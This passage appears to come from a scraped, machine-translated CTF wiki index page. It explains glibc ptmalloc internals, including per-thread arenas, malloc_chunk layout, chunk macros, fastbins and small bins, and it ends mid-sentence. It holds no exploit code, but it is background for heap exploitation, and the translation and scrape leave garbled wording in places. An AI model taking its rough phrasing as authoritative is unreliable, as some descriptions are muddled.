/proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ** After the main thread releases the memory, we can see from the output below that the corresponding arena is not recycled, but is managed by glibc. When the later program requests memory again, glibc allocates the corresponding memory to the program according to the heap allocation algorithm when the memory managed by glibc is sufficient. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ Before the first thread malloc , we can see that there is no heap associated with thread 1, but there is a stack associated with thread 1. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ The first thread after malloc , we can see from the output below that the heap segment of thread 1 was created. And its location is the memory mapped segment area, the same size is also 132KB (b7500000-b7521000). So this indicates that the corresponding function behind the thread is the mmap function. At the same time, we can see that the actual memory allocated to the program is 1M (b7500000-b7600000). Moreover, only 132KB of the part has readable and writable permissions, and this contiguous area becomes the thread arena. note: > When the memory requested by the user is greater than 128KB, and no arena has enough space, then the system will execute the mmap function to allocate the corresponding memory space. This is independent of whether the request comes from the main thread or from the thread. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ** After the first thread releases the memory, we can see from the output below that releasing the memory will not re-send the memory to the system. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$","title":"Multi-threading support"},{"location":"pwn/linux/glibc-heap/heap_overview/#references","text":"sploitfun","title":"references"},{"location":"pwn/linux/glibc-heap/heap_structure/","text":"\u5806related data structure \u00b6 The operation of the heap is so complicated, so there must be a well-designed data structure inside glibc to manage it. The data structure corresponding to the heap is mainly divided into A macro structure that contains macro information about the heap through which the basic information of the heap can be indexed. Microstructure, which is used to specifically handle the allocation and reclaiming of memory blocks. Overview\uff1f\uff1f\uff1f\uff1f \u00b6 Give a macro picture here. micro structure \u00b6 Here we first introduce the structure of the details in the heap, and the vulnerability of the heap is closely related to these structures**. malloc_chunk \u00b6 Overview \u00b6 During the execution of the program, we call the memory requested by malloc as chunk. This memory is represented inside the ptmalloc by the malloc_chunk structure. When the chunk requested by the program is free, it will be added to the corresponding idle management list. Very interestingly, they all use a uniform structure regardless of the size of a chunk, whether it is allocated or released. Although they use the same data structure, they will behave differently depending on whether they are released. The structure of malloc_chunk is as follows /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; First, here are some necessary explanations INTERNAL_SIZE_T, SIZE_SZ, MALLOC_ALIGN_MASK: /* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of chunk sizes. The default version is the same as size_t. While not strictly necessary, it is best to define this as an unsigned type, even if size_t is a signed type. This may avoid some artificial size limitations on some systems. On a 64-bit machine, you may be able to reduce malloc overhead by defining INTERNAL_SIZE_T to be a 32 bit `unsigned int' at the expense of not being able to handle more than 2^32 of malloced space. If this limitation is acceptable, you are encouraged to set this unless you are on a platform requiring 16byte alignments. In this case the alignment requirements turn out to negate any potential advantages of decreasing size_t word size. Implementors: Beware of the possible combinations of: - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits, and might be the same width as int or as long - size_t might have different width and signedness as INTERNAL_SIZE_T - int and long might be 32 or 64 bits, and might be the same width To deal with this, most comparisons and difference computations among INTERNAL_SIZE_Ts should cast them to unsigned long, being aware of the fact that casting an unsigned int to a wider long does not sign-extend. (This also makes checking for negative numbers awkward.) Some of these casts result in harmless compiler warnings on some systems. */ #ifndef INTERNAL_SIZE_T # define INTERNAL_SIZE_T size_t #endif /* The corresponding word size. */ #define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) /* The corresponding bit mask value. */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) In general, size_t is a 64-bit unsigned integer in 64 bits and a 32-bit unsigned integer in 32 bits. The specific explanation of each field is as follows prev_size , if the chunk's physically adjacent previous address chunk (the address difference between the two pointers is the previous chunk size) is idle, then the field records the previous chunk The size (including the chunk header). Otherwise, this field can be used to store data for the physical chunk of the previous chunk. The previous chunk here refers to the chunk of the lower address. size , the size of the chunk, the size must be an integer multiple of 2 * SIZE_SZ. If the requested memory size is not an integer multiple of 2 * SIZE_SZ, it will be converted to a multiple of the smallest 2 * SIZE_SZ that satisfies the size. In a 32-bit system, SIZE_SZ is 4; in a 64-bit system, SIZE_SZ is 8. The lower three bits of this field have no effect on the size of the chunk, they are represented from high to low respectively. NON_MAIN_ARENA, records whether the current chunk does not belong to the main thread, 1 means not belonging, 0 means belongs. IS_MAPPED, which records whether the current chunk is allocated by mmap. PREV_INUSE, records whether the previous chunk is allocated. In general, the P bit of the size field of the first allocated memory block in the heap is set to 1, in order to prevent access to the previous illegal memory. When the P bit of the size of a chunk is 0, we can get the size and address of the previous chunk through the prev_size field. This also facilitates the merging between free chunks. fd, bk . When the chunk is in the allocation state, it is the user's data starting from the fd field. When chunk is idle, it will be added to the corresponding idle management list. The meaning of the fields is as follows fd points to the next (non-physical neighbor) free chunk bk points to the previous (non-physical neighbor) free chunk Freed chunks can be added to the free chunk block list for unified management via fd and bk fd_nextsize, bk_nextsize , which is only used when the chunk is free, but it is used for larger chunks. fd_nextsize points to the first free block of the previous size that is different from the current chunk, and does not contain the head pointer of the bin. bk_nextsize points to the next free block of the current chunk size, excluding the head pointer of the bin. Large chunks that are generally free are arranged in descending order of fd, in descending order. Doing so avoids traversing when looking for a suitable chunk. The appearance of an already allocated chunk is as follows. We call the first two fields called chunk headers, and the latter part is called user data. The memory pointer obtained by each malloc application actually points to the beginning of user data. When a chunk is in use, its prev_size field of the next chunk is invalid, and the part of the next chunk can also be used by the current chunk. This is the spatial reuse in the chunk. chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk , in bytes | A | M | P | mem -> + - + - + - + - + - + - + - + - + - + - + + + + + + + + + + - + - + - + - + - + - + - + - + - + - + - + - + - + | User data starts here ... . . . . ( malloc_usable_size () bytes ) . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | ( size of chunk , but used for application data ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 1 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ The released chunks are recorded in a linked list (either a circular doubly linked list or a singly linked list). The specific structure is as follows chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` head : ' | Size of chunk , in bytes | A | 0 | P | mem -> + - + - + - + - + - + - + - + - + - + - + + + + + + + + + + - + - + - + - + - + - + - + - + - + - + - + - + - + | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space ( may be 0 bytes long ) . . . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` foot : ' | Size of chunk , in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 0 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ It can be found that if a chunk is in the free state, there will be two locations to record their corresponding sizes. The size field itself will be logged, The chunks following it will be logged. In general, , two free chunks of physical neighbors will be merged into one chunk. The heap manager merges two physically adjacent free chunk chunks through the prev_size field and the size field. ! ! ! Some constraints on the heap, consider it in detail later! ! ! /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */ chunk related macro \u00b6 Here mainly introduces the size of the chunk, the alignment check, and some macros for conversion. chunk and mem pointer header conversion Mem points to the starting position of the memory the user gets. /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) Minimum chunk size /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) Here, the offsetof function calculates the offset of fd_nextsize in malloc_chunk, indicating that the smallest chunk must contain at least the bk pointer. Minimum requested heap memory size The memory size requested by the user must be a minimum integer multiple of 2 * SIZE_SZ. Note: As for the current MIN_CHUNK_SIZE and MINSIZE sizes are the same, I personally think that the reason to add two macros is to facilitate the later modification of malloc_chunk. /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ ( unsigned long ) ((( MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK ) & \\ ~ MALLOC_ALIGN_MASK )) Check if the memory allocated to the user is aligned 2 * SIZE_SZ size aligned. /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ (( uintptr_t )( MALLOC_ALIGNMENT == 2 * SIZE_SZ ? ( p ) : chunk2mem ( p )) & \\ MALLOC_ALIGN_MASK ) Request Byte Count Judgment /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ (( unsigned long ) ( req ) >= ( unsigned long ) ( INTERNAL_SIZE_T )( -2 * MINSIZE )) Convert user request memory size to actual allocated memory size /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ ((( req ) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE ) \\ ? MINSIZE \\ : (( req ) + SIZE_SZ + MALLOC_ALIGN_MASK ) & ~ MALLOC_ALIGN_MASK ) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if ( REQUEST_OUT_OF_RANGE ( req )) { \\ __set_errno ( ENOMEM ); \\ return 0 ; \\ } \\ ( sz ) = request2size ( req ); When a chunk is in the allocated state, the prev_size field of its next physical next chunk must be invalid, so this field can be used by the current chunk. This is the multiplexing between chunks in ptmalloc. The specific process is as follows First, use REQUEST_OUT_OF_RANGE to determine if the chunk of the byte size requested by the user can be allocated. Second, it should be noted that the byte requested by the user is used to store data, that is, the part after the chunk header. At the same time, due to the multiplexing between chunks, the prev_size field of the next chunk can be used. Therefore, you only need to add the SIZE_SZ size to fully store the content. Since the minimum chunk of the application allowed in the system is MINSIZE, it is compared. If the minimum requirement is not met, then the MINSIZE byte needs to be allocated directly. If it is greater, because the chunk requested in the system requires 2 * SIZE_SZ alignment, MALLOC_ALIGN_MASK needs to be added here to facilitate alignment. Personally think that it is not necessary to add MALLOC_ALIGN_MASK in the first line of the request2size macro. It should be noted that the size obtained by such a calculation formula must ultimately satisfy the user's needs. Marker related /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Get chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) Get the next physical neighboring chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) Get information about the previous chunk /* Size of the chunk below P. Only valid if !prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if !prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if !prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) Current chunk usage status related operations /* extract p's inuse bit */ #define inuse(p) \\ (((( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size ) & PREV_INUSE ) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ (( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ (( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size &= ~ ( PREV_INUSE ) Set the size field of the chunk /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ (( p ) -> mchunk_size = ((( p ) -> mchunk_size & SIZE_BITS ) | ( s ))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ ((( mchunkptr )(( char * ) ( p ) + ( s ))) -> mchunk_prev_size = ( s )) Get the chunk of the specified offset /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) Specify the offset at the chunk usage state related operation /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ ((( mchunkptr )((( char * ) ( p )) + ( s ))) -> mchunk_size & PREV_INUSE ) #define set_inuse_bit_at_offset(p, s) \\ ((( mchunkptr )((( char * ) ( p )) + ( s ))) -> mchunk_size |= PREV_INUSE ) #define clear_inuse_bit_at_offset(p, s) \\ ((( mchunkptr )((( char * ) ( p )) + ( s ))) -> mchunk_size &= ~ ( PREV_INUSE )) am \u00b6 Overview \u00b6 We have said that the chunks released by the user will not be returned to the system immediately, and ptmalloc will uniformly manage the free chunks in the heap area of the heap and mmap. When the user again requests memory allocation, the ptmalloc allocator will attempt to pick a suitable one for the user in the free chunk. This avoids frequent system calls and reduces the overhead of memory allocation. In a specific implementation, ptmalloc manages idle chunks in a bin-wise manner. First, it will initially classify chunks into four categories based on the size of the free chunks and the state of use: fast bins, small bins, large bins, unsorted bins. There is still a finer division in each class, and similarly sized chunks are linked by a doubly linked list. That is to say, there will still be multiple unrelated lists in each type of bin to hold chunks of different sizes. For small bins, large bins, unsorted bins, ptmalloc maintains them in the same array. The data structure corresponding to these bins is in malloc_state, as follows #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; Although the header of each bin uses the mchunkptr data structure, this is just for the convenience of converting each bin into a malloc_chunk pointer. When we use it, we will use this pointer as a chunk's fd or bk pointer to link together the free heap blocks. This saves space and increases usability. How is it saved? Here we take 32-bit system as an example. Meaning bin1 fd/bin2 prev_size bin1 bk/bin2 size bin2 fd/bin3 prev_size bin2 bk/bin3 size | bin bottom board | 0 | 1 | 2 | 3 | It can be seen that in addition to the first bin (unsorted bin), each subsequent bin will share the field of the previous bin, which is treated as the prev_size and size of the malloc chunk. Here also illustrates a problem, the subscript of bin is not consistent with the first few bins we are talking about. At the same time, the prev_size and size fields of the chunk of the bin header cannot be modified casually, because these two fields are used by other bins. The bin in the array is described as follows The first one is unsorted bin, the word is like this, the chunks inside are not sorted, and the stored chunks are more complicated. The bins with indexes from 2 to 63 are called small bins, and the chunks in the same small bin list are the same size. The number of bytes in the small bin list of two adjacent indexes differs by 2 machine words long , that is, 32 bits differ by 8 bytes, and 64 bits differ by 16 bytes. The bin behind small bins is called large bins. Each bin in large bins contains a range of chunks, with chunks arranged in descending order of fd pointers. Chunks of the same size are also arranged in the order of recent use. In addition, the arrangement of these bins will follow a principle: Any two physically adjacent free chunks cannot be together . It should be noted that not all chunks are released into the bin immediately after they are released. In order to increase the speed of allocation, ptmalloc will put some small chunks into the container of fast bins. Moreover, the usage flags of the chunks in the fastbin container are always set, so the above principles are not met. ** Bin general macro is as follows typedef struct malloc_chunk * mbinptr ; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ ( mbinptr )((( char * ) & (( m ) -> bins [ (( i ) -1 ) * 2 ])) - \\ offsetof ( struct malloc_chunk , fd )) /* analog of ++bin */ / / Get the address of the next bin #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // These two macros can be used to traverse the bin / / Get the chunk of the bin at the head of the list header #define first(b) ((b)->fd) / / Get the chunk of the bin at the end of the chain #define last(b) ((b)->bk) Fast Bin \u00b6 Most programs often apply and release some smaller blocks of memory. If some smaller chunks are released and there are free chunks adjacent to them and merged, then the next time you apply for the chunk of the corresponding size again, you need to split the chunk, which greatly reduces the heap. usage efficiency. Because we spend most of our time in the process of merging, segmentation, and intermediate checks. Therefore, the fast bin is specifically designed in ptmalloc, and the corresponding variable is fastbinsY in malloc state. /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk * mfastbinptr ; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; */ In order to use the fast bin more efficiently, glibc uses a singly linked list to organize each bin, and each bin adopts the LIFO policy , and the recently released chunk will be allocated earlier, so it is more suitable for Locality. That is to say, when the size of the chunk that the user needs is smaller than the maximum size of the fastbin, ptmalloc will first determine whether there is a free block of the corresponding size in the corresponding bin in the fastbin, if any, the chunk will be directly obtained from the bin. . If not, ptmalloc will do the next series of operations. By default ( 32-bit system is an example ), the maximum chunk size supported by default in fastbin is 64 bytes. But the chunk of data that it can support is up to 80 bytes. In addition, fastbin can support up to 10 bins, starting from 8 bytes in data space up to 80 bytes (note that the size of the data space is the same, that is, the prev_size and size fields are removed. Size) is defined as follows #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ / / Determine whether the allocation area has fast bin chunk , 1 means no #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // Whether MORECORE returns a contiguous memory area. // MORECORE in the main allocation area is actually sbr(), which returns the default virtual address space by default. // The non-primary allocation area uses mmap() to allocate large blocks of virtual memory and then splits to simulate the behavior of the primary allocation area. // By default, the mmap mapping area does not guarantee that the virtual address space is continuous, so the non-primary allocation area allocates non-contiguous virtual address space by default. #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ ((( s ) == 0 ) ? SMALLBIN_WIDTH : (( s + SIZE_SZ ) & ~ MALLOC_ALIGN_MASK )) #define get_max_fast() global_max_fast By default, ptmalloc calls set_max_fast(s) to set the global variable global_max_fast to DEFAULT_MXFAST, which is the maximum value of the chunk in the fast bins. When MAX_FAST_SIZE is set to 0, the system does not support fastbin. fastbin index #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) / / Here to reduce 2 , otherwise , the first two bins have no way to index . #define fastbin_index(sz) \\ (((( unsigned int ) ( sz )) >> ( SIZE_SZ == 8 ? 4 : 3 )) - 2 ) It is important to note that the inuse of the chunk of the fastbin range is always set to 1. Therefore they will not merge with other released chunks. However, when the size of the released chunk and the free chunk adjacent to the chunk are larger than FASTBIN_CONSOLIDATION_THRESHOLD, the memory fragmentation may be more. We need to merge the chunks in the fast bins to reduce the impact of memory fragmentation on the system. /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) The malloc_consolidate function combines all the chunks in the fastbin that can be merged with other chunks. See in detail the analysis of subsequent detailed functions. /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ Small Bin \u00b6 The relationship between the size of each chunk in small bins and the index of the bin it is in is: chunk_size = 2 * SIZE_SZ *index, as follows Subscript SIZE_SZ=4 (32-bit) SIZE_SZ=8 (64-bit) | 2 | 16 | 32 | | 3 | 24 | 48 | | 4 | 32 | 64 | | 5 | 40 | 80 | | x | 2*4*x | 2*8*x | | 63 | 504 | 1008 | There are a total of 62 circular doubly linked lists in small bins, and the chunks stored in each linked list are the same size. For example, for a 32-bit system, the chunk size stored in the doubly linked list corresponding to subscript 2 is 16 bytes. Each linked list has a linked list node, which makes it easy to manage the internal nodes of the linked list. In addition, the linked list for each bin in small bins uses the FIFO rule , so the chunks that are first released in the same linked list are first allocated. The small bin related macros are as follows #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // Do you need to correct the subscript of the small bin? #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) / / Determine whether the size of the chunk is within the range of small bin #define in_smallbin_range(sz) \\ (( unsigned long ) ( sz ) < ( unsigned long ) MIN_LARGE_SIZE ) // Get the index corresponding to the small bin according to the size of the chunk. #define smallbin_index(sz) \\ (( SMALLBIN_WIDTH == 16 ? ((( unsigned ) ( sz )) >> 4 ) \\ : ((( unsigned ) ( sz )) >> 3 )) + \\ SMALLBIN_CORRECTION ) Perhaps, everyone will be very confused, the size of the chunks in the fastbin and small bin will have a large part of the overlap, then the size of the bin in the small bin is not useful? In fact, the chunks in the fast bin are likely to be placed in the small bin. We will have a deep understanding when analyzing the specific source code later. Large Bin \u00b6 A large total of 63 bins are included in the large 